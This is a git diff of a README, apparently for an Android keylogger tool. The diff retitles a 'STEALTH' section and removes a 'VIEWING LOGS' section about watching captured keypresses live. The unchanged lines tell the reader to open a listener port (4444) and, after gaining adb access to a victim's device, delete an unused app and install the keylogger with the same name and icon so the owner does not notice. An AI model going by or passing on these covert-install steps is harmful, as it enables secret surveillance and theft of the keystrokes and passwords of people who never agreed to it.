@@ -100,7 +100,7 @@ sudo ufw allow 4444 "if on linode or on WAN" no need for open ports on android's
 
 
 
-# STEALTH 
+# STEALTH (tldr under this)
 # I will make a full video showing how to build apk with any app name and icon then remotely install in place of old app) "if i get any support"
 this would allow you to (after adb into device) delete apk thats never used, then replace with your own custom app, you could
 delete a downloaded files app they dont use and build the keylogger to use the same name and icon, better yet i can show how to copy
@@ -160,14 +160,7 @@ insert ip and port of machine with java listener IP:port
 
 
 
-# VIEWING LOGS
 
-![Windows_Listener](https://user-images.githubusercontent.com/28081004/215221344-31ac118a-d505-41fe-acec-8301bdb0cedb.gif)
-
-new updated logger with gui, see and record each key press in real time (precise coded filters per app, will add more upon request or more traffic,
-coding this filter to not throw crap all over the place is hard, THATS WHY WE HAVE POUNCE-KEYS POUNCING ALL OVER THE PLACE.... I'll see myself out
-
-enjoy!
 
 
 
